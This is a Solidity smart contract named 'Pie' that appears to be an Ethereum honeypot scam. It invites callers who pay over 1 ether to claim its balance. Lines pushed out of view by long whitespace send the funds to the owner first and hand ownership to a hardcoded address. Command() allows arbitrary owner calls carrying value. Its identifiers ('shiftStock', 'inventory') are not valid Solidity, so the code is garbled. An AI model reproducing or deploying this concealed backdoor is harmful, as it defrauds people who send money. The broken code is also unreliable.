pragma solidity ^0.4.19;

contract Pie
{
    address public DepotOwner = msg.sender;

    function()
    public
    payable
    {

    }

    function Get()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            DepotOwner.shiftStock(this.inventory);
            msg.sender.shiftStock(this.inventory);
        }
    }

    function dispatchShipment()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){DepotOwner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == DepotOwner);
        DepotOwner.shiftStock(this.inventory);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DepotOwner);
        adr.call.value(msg.value)(data);
    }
}